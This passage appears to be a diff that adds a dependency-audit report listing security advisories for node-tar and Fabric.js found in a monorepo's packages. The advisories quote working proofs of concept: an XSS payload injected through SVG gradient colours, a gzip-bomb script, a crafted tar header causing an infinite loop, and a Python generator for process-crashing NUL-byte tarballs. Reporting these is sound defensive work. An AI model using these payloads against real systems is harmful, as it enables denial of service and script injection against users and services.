tools\n(`longname.txt`, `file_b`).\n\n### Suggested fix\n\nWhen decoding a header, do not apply PAX `size` (or other PAX overrides) if the\nheader being decoded is itself an extension header. Concretely, in\n`src/parse.ts` clear/ignore `this[EX]` (and `this[GEX]` for `size`) when the\nheader's type is `ExtendedHeader`, `GlobalExtendedHeader`, `NextFileHasLongPath`\n(GNU `L`), or `NextFileHasLongLinkpath` (GNU `K`); equivalently, in\n`Header.decode`, gate the `ex?.size ?? gex?.size` override on the decoded type\nnot being one of those extension types. This mirrors the upstream Rust fix,\nwhich guards `pax_size` with\n`is_gnu_longname || is_gnu_longlink || is_pax_local_extensions || is_pax_global_extensions`.\n\nA fix PR is being prepared against a private fork and will be linked here.\n\n### Fix PR\n\nTo be linked from a private fork of the repository (the fix will not be pushed\nto any public fork or to upstream during embargo).\n\n### Credits\n\nReported by tonghuaroot.",
+      "reported_by": null,
+      "title": "node-tar applies PAX size override to intermediary GNU long-name/long-link headers, causing tar parser interpretation differential (file smuggling)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53655"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.15",
+      "github_advisory_id": "GHSA-vmf3-w455-68vh",
+      "recommendation": "Upgrade to version 7.5.16 or later",
+      "patched_versions": ">=7.5.16",
+      "updated": "2026-06-15T17:19:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-vmf3-w455-68vh"
+    },
+    "1123703": {
+      "findings": [
+        {
+          "version": "6.9.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fabricjs/fabric.js/security/advisories/GHSA-w22m-hvvm-xmwx\n- https://github.com/fabricjs/fabric.js/releases/tag/v740\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44311\n- https://github.com/advisories/GHSA-w22m-hvvm-xmwx",
+      "created": "2026-06-12T21:00:32.000Z",
+      "id": 1123703,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA potential Cross-Site Scripting (XSS) vulnerability exists in Fabric.js due to improper escaping of user-controlled input during SVG serialization via the `toSVG()` method.\n\nSpecifically, the `color` field within the `colorStops` array of a `fabric.Gradient` object is not properly escaped when converted into SVG `<stop>` elements. If an application renders the generated SVG string into the DOM (e.g., via `innerHTML`), this may allow an attacker to inject arbitrary HTML/SVG and execute JavaScript in the victim's browser.\n\n### Details\n\nDuring SVG export, Fabric.js serializes gradient color stops into `<stop>` elements like:\n\n```xml\n<stop offset=\"0\" stop-color=\"...\"></stop>\n```\n\nHowever, the `color` value is inserted into the `stop-color` attribute without proper escaping of special characters such as `\"`, `<`, and `>`. This allows crafted input to break out of the attribute context and inject arbitrary markup.\n\nFor example:\n```js\ncolor: 'red\"><img src=\"x\" onerror=\"alert(1)\">'\n```\n\nmay result in:\n```xml\n<stop offset=\"0\" stop-color=\"red\">\n<img src=\"x\" onerror=\"alert(1)\">\n```\nThis breaks the intended SVG structure and introduces executable HTML.\n\n### PoC (Proof of Concept)\n\nSuccessfully verified on **v7.2.0** (current latest version). The following HTML and JavaScript code reproduces the vulnerability. The code constructs a rectangle with a maliciously crafted gradient color stop and exports it to SVG:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n   <title>Fabric.js SVG Export XSS Bypass Test</title>\n   <script src=\"[https://cdn.jsdelivr.net/npm/fabric@7.2.0/dist/index.js](https://cdn.jsdelivr.net/npm/fabric@7.2.0/dist/index.js)\"></script>\n</head>\n<body>\n   <h1>Fabric.js SVG Export XSS Bypass Test (Gradient Color)</h1>\n   <canvas id=\"c\" width=\"400\" height=\"300\"></canvas>\n   \n   <h3>SVG Output Rendering:</h3>\n   <div id=\"svg-output\" style=\"border: 1px solid #ccc; padding: 10px; margin-top: 10px;\"></div>\n\n   <script>\n       setTimeout(() => {\n           const canvas = new fabric.Canvas('c');\n           \n           // Construct a malicious gradient object\n           const maliciousGradient = new fabric.Gradient({\n               type: 'linear',\n               coords: { x1: 0, y1: 0, x2: 100, y2: 0 },\n               colorStops: [\n                   {\n                       offset: 0,\n                       // Inject XSS payload to prematurely close the attribute/tag\n                       color: 'red\"><img src=\"x\" onerror=\"alert(\\'XSS Triggered Successfully!\\')\">'\n                   },\n                   { offset: 1, color: 'blue' }\n               ]\n           });\n\n           const rect = new fabric.Rect({\n               left: 50, top: 50, width: 300, height: 100,\n               fill: maliciousGradient\n           });\n\n           canvas.add(rect);\n\n           // Export to SVG string containing the malicious code\n           const svgOutput = canvas.toSVG();\n\n           // Render on the page to trigger the XSS\n           document.getElementById('svg-output').innerHTML = svgOutput;\n       }, 100);\n   </script>\n</body>\n</html>\n```\n\n### Impact\n\nThis issue can lead to XSS in applications that:\n1. Allow user-controlled input in gradient definitions (e.g., color values)\n2. Use `canvas.toSVG()` to export content\n3. Insert the resulting SVG string into the DOM without sanitization (e.g., via `innerHTML`)\n\nSuccessful exploitation may result in the execution of arbitrary JavaScript in the victim's browser, theft of sensitive data, or unauthorized actions on behalf of the user.\n\n### Suggested Fix\n**Proper Escaping (Recommended)**: Escape special characters in attribute values during SVG serialization.",
+      "reported_by": null,
+      "title": "Fabric.js improper escaping in fabric.Gradient colorStops leads to XSS in SVG serialization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-44311"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fabric",
+      "vulnerable_versions": "<7.4.0",
+      "github_advisory_id": "GHSA-w22m-hvvm-xmwx",
+      "recommendation": "Upgrade to version 7.4.0 or later",
+      "patched_versions": ">=7.4.0",
+      "updated": "2026-07-18T17:26:22.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-w22m-hvvm-xmwx"
+    },
+    "1123939": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-w8wr-v893-vjvp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59871\n- https://github.com/isaacs/node-tar/commit/e02a4e9e013c4be95302e2eb2047a942b883c27b\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.18\n- https://github.com/advisories/GHSA-w8wr-v893-vjvp",
+      "created": "2026-07-20T21:53:14.000Z",
+      "id": 1123939,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA crafted 2.5KB tar archive crashes any Node.js process that extracts it. The PAX header parser coerces all-digit path values to JavaScript numbers, which causes an uncaught TypeError when downstream code calls `.split('/')` on the numeric value. Error handlers and `strict: false` cannot intercept the crash.\n\n### Details\n\nIn `pax.ts` line 180, `parseKV` converts PAX values matching `/^[0-9]+$/` to numbers via `+v`. This applies to all fields including `path` and `linkpath`. When a PAX header sets `path` to an all-digit string like `\"12345\"`, the value becomes the number `12345`.\n\nThis number flows through Header -> ReadEntry -> Unpack.CHECKPATH, where `normalizeWindowsPath(entry.path).split('/')` throws a TypeError because numbers don't have `.split()`.\n\nThe throw is synchronous during event emission and bypasses all error handling:\n- `strict: false` does not help\n- `'error'` event handlers do not catch it\n- `'warn'` handlers do not catch it\n- The TypeError propagates through the event emitter stack as an uncaughtException\n\nDirectory, SymbolicLink, and Link type entries reach CHECKPATH and crash. File type entries crash earlier in Header constructor at `this.path.slice(-1)`, but that throw is caught and emitted as a warning only.\n\n### PoC\n\nCreate a tar archive with a PAX extended header containing an all-digit path:\n\n```\nPAX header body: \"18 path=12345\\n\"\nEntry type: Directory (type '5')\n```\n\nExtract it:\n```js\nconst tar = require('tar');\n\n// All of these crash with TypeError: t.split is not a function\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test' });\n\n// Error handlers don't help:\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test', strict: false })\n  .on('error', (err) => { /* never reached */ })\n  .on('warn', (code, msg) => { /* never reached */ });\n```\n\nThe archive is ~2.5KB. The crash is deterministic on every attempt.\n\n### Impact\n\nDenial of service. Any application or tool that extracts untrusted tar archives crashes from a single small file. This includes npm (which uses node-tar to extract packages), CI/CD pipelines, file upload processors, and backup tools. The crash cannot be caught by application-level error handling.",
+      "reported_by": null,
+      "title": "node-tar: Process crash via PAX numeric path type confusion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59871"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.17",
+      "github_advisory_id": "GHSA-w8wr-v893-vjvp",
+      "recommendation": "Upgrade to version 7.5.18 or later",
+      "patched_versions": ">=7.5.18",
+      "updated": "2026-07-20T21:53:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-704"
+      ],
+      "url": "https://github.com/advisories/GHSA-w8wr-v893-vjvp"
+    },
+    "1123940": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-23hp-3jrh-7fpw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59873\n- https://github.com/isaacs/node-tar/commit/2812e9338665659b183aa7226518c307044957d3\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.19\n- https://github.com/advisories/GHSA-23hp-3jrh-7fpw",
+      "created": "2026-07-20T21:52:03.000Z",
+      "id": 1123940,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.\n\n1. Create the exploit script:\n```javascript\nconst fs = require('fs'), z = require('zlib'), t = require('tar');\n\nconst d = 'dos_test';\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\nfs.mkdirSync(d);\n\n// Build 10GB header\nconst h = Buffer.alloc(512);\nh.write('payload');\nh.write((10*1024**3).toString(8).padStart(11,'0'), 124); \nh.write('ustar', 257);\nlet s = 256;\nfor(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];\nh.write(s.toString(8).padStart(6,'0'), 148);\n\nconst gz = z.createGzip();\ngz.pipe(t.x({cwd: d}));\ngz.write(h);\n\nconst b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\n\nconst run = () => {\n  while (gz.write(b));\n  gz.once('drain', run);\n};\n\nconst monitor = setInterval(() => {\n    try {\n        const bytes = fs.statSync(`${d}/payload`).size;\n        const mb = Math.floor(bytes / (1024 * 1024));\n        process.stdout.write(`\\r[>] Extracted: ${mb} MB`);\n        \n        if (mb > 5000) { \n            console.log('\\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); \n            process.exit(); \n        }\n    } catch {}\n}, 50);\n\nprocess.on('exit', () => {\n    clearInterval(monitor);\n    console.log('[*] Cleaning up...');\n    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\n});\n\nrun();\n```\n\n2. Run the PoC:\n```bash\nnode poc.js\n```\n\n**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being \"sent\" through the gzip stream is negligible.\n\n### Impact\nThis is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.",
+      "reported_by": null,
+      "title": "node-tar: Decompression/parse DoS via unlimited input",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59873"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.18",
+      "github_advisory_id": "GHSA-23hp-3jrh-7fpw",
+      "recommendation": "Upgrade to version 7.5.19 or later",
+      "patched_versions": ">=7.5.19",
+      "updated": "2026-07-20T21:52:04.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-23hp-3jrh-7fpw"
+    },
+    "1123941": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8x88-c5mf-7j5w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59874\n- https://github.com/isaacs/node-tar/commit/9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.18\n- https://github.com/advisories/GHSA-8x88-c5mf-7j5w",
+      "created": "2026-07-20T21:51:39.000Z",
+      "id": 1123941,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n### PoC\n\nSave as `poc.mjs` in a project with the vulnerable package installed and run:\n\n```bash\nnode poc.mjs\n```\n\n```js\nimport fs from 'node:fs'\nimport os from 'node:os'\nimport path from 'node:path'\nimport { spawnSync } from 'node:child_process'\n\nconst oct = (b, n, off, len) =>\n  b.write(n.toString(8).padStart(len - 1, '0') + '\\0', off, len, 'ascii')\n\nconst badHeader = () => {\n  const h = Buffer.alloc(512)\n\n  h.write('x', 0)\n  oct(h, 0o644, 100, 8)\n  oct(h, 0, 108, 8)\n  oct(h, 0, 116, 8)\n\n  // base-256 encoded -512 in the size field\n  Buffer.alloc(10, 0xff).copy(h, 124)\n  h[134] = 0xfe\n  h[135] = 0x00\n\n  oct(h, 0, 136, 12)\n  h.fill(0x20, 148, 156)\n  h[156] = 0x30\n  h.write('ustar\\0' + '00', 257, 8, 'binary')\n\n  let sum = 0\n  for (const c of h) sum += c\n  h.write(sum.toString(8).padStart(6, '0') + '\\0 ', 148, 8, 'ascii')\n\n  return h\n}\n\nconst dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))\nconst file = path.join(dir, 'poc.tar')\n\nfs.writeFileSync(file, badHeader())\nfs.writeFileSync(path.join(dir, 'add.txt'), 'x')\n\nconst r = spawnSync(\n  process.execPath,\n  [\n    '--input-type=module',\n    '-e',\n    `\n      import * as tar from 'tar'\n      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])\n      console.log('completed')\n    `,\n  ],\n  { timeout: 20_000 }\n)\n\nconsole.log(r.error?.code === 'ETIMEDOUT')\n\n// Output: true\n```\n\n### Impact\n\nAn application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.",
+      "reported_by": null,
+      "title": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59874"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.17",
+      "github_advisory_id": "GHSA-8x88-c5mf-7j5w",
+      "recommendation": "Upgrade to version 7.5.18 or later",
+      "patched_versions": ">=7.5.18",
+      "updated": "2026-07-20T21:51:39.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-8x88-c5mf-7j5w"
+    },
+    "1123942": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-gvwx-54wh-qm9j\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59875\n- https://github.com/isaacs/node-tar/commit/7a635c29f5edbf083557374d43984273ecfed5b3\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.17\n- https://github.com/advisories/GHSA-gvwx-54wh-qm9j",
+      "created": "2026-07-20T21:51:12.000Z",
+      "id": 1123942,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`node-tar` strips trailing `NUL` bytes from long-name (`L`) and long-linkpath (`K`) GNU extended headers but does **not** apply the same sanitization to equivalent fields delivered via PAX (`x` typeflag) extended headers. A PAX record of the form `path=visible.txt\\x00hidden.txt` is parsed verbatim into `entry.path` and flows into `fs.lstat()` / `fs.open()`, which Node.js core rejects with `ERR_INVALID_ARG_VALUE`. The throw originates inside an `FSReqCallback` async chain that is **not** wrapped by the consumer's `await/try-catch` around `tar.x()` — it surfaces as `uncaughtException` and terminates the process.\n\nThis is a remote denial-of-service primitive against any process that extracts attacker-supplied tarballs through `tar.x` / `tar.extract` / `tar.t` / `tar.Parser`, even when the consumer follows the documented `try/catch` error-handling pattern.\n\nA secondary parser-differential (CWE-436) exists because `tar(1)`, `bsdtar`, and Python `tarfile` truncate the path at the first `NUL` (yielding `visible.txt`) while node-tar retains the full string. A validator that pre-scans a tarball with one tool and extracts with the other is bypassed.\n\n---\n\n## Root cause\n\n### Vulnerable sink — `src/pax.ts:157-183`\n\nPAX KV records flow through `parseKVLine`. The value half (`v`) is assigned directly to the result object with no sanitization for embedded NUL bytes:\n\n```ts\n// src/pax.ts:157\nconst parseKVLine = (set: Record<string, unknown>, line: string) => {\n  const n = parseInt(line, 10)\n  if (n !== Buffer.byteLength(line) + 1) return set\n  line = line.slice((n + ' ').length)\n  const kv = line.split('=')\n  const r = kv.shift()\n  if (!r) return set\n  const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n  const v = kv.join('=')                                 // <-- NO NUL STRIP\n  set[k] =\n    /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n      new Date(Number(v) * 1000)\n    : /^[0-9]+$/.test(v) ? +v\n    : v                                                  // <-- v with NULs lands here\n  return set\n}\n```\n\nThe PAX record body is length-prefixed, so the parser knows the exact byte boundary — but it never checks whether the value half between `=` and `\\n` contains `NUL`. The result is consumed by `Header` / `ReadEntry`, where `entry.path` and `entry.linkpath` carry the embedded NUL all the way to `fs.lstat()`.\n\n### Correctly-patched cousin sink — `src/parse.ts:375-388`\n\nThe equivalent code path for GNU L/K long-headers **does** strip NUL bytes:\n\n```ts\n// src/parse.ts:375\ncase 'NextFileHasLongPath':\ncase 'OldGnuLongPath': {\n  const ex = this[EX] ?? Object.create(null)\n  this[EX] = ex\n  ex.path = this[META].replace(/\\0.*/, '')               // <-- NUL strip applied\n  break\n}\ncase 'NextFileHasLongLinkpath': {\n  const ex = this[EX] || Object.create(null)\n  this[EX] = ex\n  ex.linkpath = this[META].replace(/\\0.*/, '')           // <-- NUL strip applied\n  break\n}\n```\n\nThe `parse.ts` fix is the maintainer's own acknowledgement that path strings on this codepath must be NUL-stripped before reaching `fs.*`. The PAX path produces the identical primitive but bypasses the guard.\n\n### Downstream blast radius\n\n`entry.path` and `entry.linkpath` are consumed in:\n- `src/unpack.ts` → `fs.lstat`, `fs.open`, `fs.symlink`, `fs.link`, `fs.mkdir`\n- `src/list.ts` (no crash — listing tolerates NUL in strings)\n- Any consumer of the `ReadEntry` event that calls `path.join()` / `fs.*` on `entry.path`\n\nThe crash fires inside the FSReqCallback Node-internal async machinery, **outside** the user's `await tar.x(...)` Promise rejection boundary.\n\n---\n\n## Proof of Concept\n\n### Artifacts\n- `poc-null-byte-crash.tar` — 3072 bytes — PAX `path=visible.txt\\x00hidden.txt`\n- `poc-null-linkpath-crash.tar` — 2560 bytes — PAX `linkpath=target\\x00garbage` (symlink target sink)\n- `poc1-pax-prefix.py` — minimal PAX-header builder (Python 3, no deps)\n\n### Tarball generator (minimal repro — Python 3)\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PAX-NUL-injection tarball generator for node-tar PoC.\"\"\"\nimport os\n\ndef cksum(b):\n    s = 0\n    for i, x in enumerate(b):\n        s += 0x20 if 148 <= i < 156 else x\n    return s\n\ndef pad512(buf):\n    rem = len(buf) % 512\n    return buf + b'\\0' * (512 - rem) if rem else buf\n\ndef hdr(name, size, typeflag, prefix=b'', linkpath=b''):\n    b = bytearray(512)\n    b[0:len(name[:100])] = name[:100]\n    b[100:108] = b'0000644\\0'\n    b[108:116] = b'0001000\\0'\n    b[116:124] = b'0001000\\0'\n    b[124:136] = ('%011o ' % size).encode()\n    b[136:148] = ('%011o ' % 0).encode()\n    b[148:156] = b'        '\n    b[156:157] = typeflag\n    b[157:157+len(linkpath[:100])] = linkpath[:100]\n    b[257:265] = b'ustar\\x0000'\n    b[265:270] = b'root\\0'\n    b[297:302] = b'root\\0'\n    b[329:337] = b'0000000\\0'\n    b[337:345] = b'0000000\\0'\n    b[345:345+len(prefix[:155])] = prefix[:155]\n    s = cksum(b)\n    b[148:156] = ('%06o\\0 ' % s).encode()\n    return bytes(b)\n\ndef pax(records):\n    body = b''\n    for k, v in records:\n        kv = b' ' + k + b'=' + v + b'\\n'\n        for digits in range(1, 8):\n            total = digits + len(kv)\n            if len(str(total)) == digits:\n                break\n        body += str(total).encode() + kv\n    return pad512(hdr(b'PaxHeader/poc', len(body), b'x') + body)\n\nout  = pax([(b'path', b'visible.txt\\x00hidden.txt')])  # NUL in PAX path\nout += hdr(b'placeholder', 1, b'0')\nout += pad512(b'A')\nout += b'\\0' * 1024  # end-of-archive\n\nopen('poc.tar', 'wb').write(out)\n```\n\n### Reproduction\n\n```bash\n# 1. Generate tarball\npython3 poc1-pax-prefix.py          # writes poc.tar (3 KB)\n\n# 2. Install vulnerable version\nmkdir repro && cd repro\nnpm init -y && npm install tar@7.5.16\n\n# 3. Try to extract with documented try/catch — observe uncaught exception\nmkdir -p ./out\nnode --input-type=module -e '\n  process.on(\"uncaughtException\", e => {\n    console.log(\"UNCAUGHT:\", e.code, \"-\", e.message);\n    process.exit(99);\n  });\n  import(\"tar\").then(async tar => {\n    try {\n      await tar.x({ file: \"../poc.tar\", cwd: \"./out\" });\n      console.log(\"NORMAL_RETURN\");\n    } catch (e) {\n      console.log(\"CAUGHT_BY_USER:\", e.code);\n    }\n  });'\n```\n\n### Observed output (verified 2026-06-23 against `tar@7.5.16`)\n\n```\nUNCAUGHT: ERR_INVALID_ARG_VALUE - The argument 'path' must be a string,\nUint8Array, or URL without null bytes.\nReceived '/.../out/visible.txt\\x00hidden.txt'\nexit: 99\n```\n\nThe exception bypasses the user's `try { await tar.x(...) } catch (e) { ... }` block and lands in the global `uncaughtException` handler. In a typical server without that handler, the process exits.\n\n---\n\n## Impact\n\n### Direct: remote DoS\n\nAny service that ingests attacker-supplied tarballs via node-tar inherits a one-tarball-kills-the-process primitive. Realistic deployments where this is reachable without user interaction:\n\n- npm registry tarball ingestion and downstream mirrors\n- GitHub Actions cache restore (`actions/cache`, `actions/setup-*` extracting toolchains)\n- Container image build pipelines that unpack layer tarballs through node tooling\n- Backup-restore services accepting user uploads\n- CI artifact processors and badge generators\n- Static-site / Docusaurus / Next.js build runners that fetch and extract dep tarballs\n- Cloud functions that auto-extract uploaded archives\n\nA correctly-coded consumer that does:\n\n```js\ntry {\n  await tar.x({ file: req.upload.path, cwd: tmpdir });\n} catch (e) {\n  return res.status(400).json({ error: 'bad archive' });\n}\n```\n\ndoes not catch this throw. The Node process dies and (depending on the supervisor) the worker may take time to respawn or never respawn if it dies during boot.\n\n### Secondary: parser-differential validator bypass (CWE-436)\n\n| Tool                       | Result for `path=visible.txt\\x00hidden.txt` |\n|----------------------------|----------------------------------------------|\n| GNU tar (`tar -tvf`)       | Lists `visible.txt` (truncated at NUL)      |\n| `bsdtar -tvf`              | Lists `visible.txt` (truncated at NUL)      |\n| Python `tarfile.list()`    | Lists `visible.txt\\x00hidden.txt` (raw)     |\n| node-tar `tar.t({file})`   | Emits raw NUL-bearing path (no crash)       |\n| node-tar `tar.x({file})`   | **Crashes** (uncaught throw)                |\n\nA pre-flight validator using GNU tar or bsdtar will see a benign filename; the subsequent node-tar extraction blows up. This is exploitable against any architecture that lists-and-validates-then-extracts.\n\n---\n\n## Suggested patch\n\nMatch the long-name handler in `parse.ts` — strip everything from the first NUL onward in `parseKVLine` value parsing:\n\n```diff\n--- a/src/pax.ts\n+++ b/src/pax.ts\n@@ -173,7 +173,7 @@ const parseKVLine = (set: Record<string, unknown>, line: string) => {\n\n   const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n\n-  const v = kv.join('=')\n+  const v = kv.join('=').replace(/\\0.*$/, '')\n   set[k] =\n     /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n       new Date(Number(v) * 1000)\n```\n\nThis matches `src/parse.ts:379` and `src/parse.ts:386` and closes both `path` and `linkpath` sinks in one change.\n\nA defense-in-depth follow-up: add an explicit `assert(!v.includes('\\0'))` (or fail-soft `return set`) at the top of `parseKVLine` so malformed PAX records that *aren't* path/linkpath also can't smuggle NUL into other unanticipated consumers (e.g. third-party readers of `entry.header.atime` Date objects constructed from `Number(v)` where `v` had embedded NUL).",
+      "reported_by": null,
+      "title": "node-tar: Uncaught Exception DoS via NUL byte in PAX path/linkpath records",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59875"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.16",
+      "github_advisory_id": "GHSA-gvwx-54wh-qm9j",
+      "recommendation": "Upgrade to version 7.5.17 or later",
+      "patched_versions": ">=7.5.17",
+      "updated": "2026-07-20T21:51:12.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-gvwx-54wh-qm9j"
+    },
+    "1145093": {
+      "findings": [
+        {
+          "version": "7.1.5",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/config@7.8.0 > deepmerge-ts@7.1.5",
+            ". > prisma@7.8.0 > @prisma/config@7.8.0 > deepmerge-ts@7.1.5",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/config@7.8.0 > deepmerge-ts@7.1.5",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/config@7.8.0 > deepmerge-ts@7.1.5"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/RebeccaStevens/deepmerge-ts/security/advisories/GHSA-ggr8-5vv4-36mx\n- https://github.com/RebeccaStevens/deepmerge-ts/releases/tag/v8.0.0\n- https://github.com/advisories/GHSA-ggr8-5vv4-36mx",
+      "created": "2026-08-17T13:32:13.000Z",
+      "id": 1145093,
+      "npm_advisory_id": null,
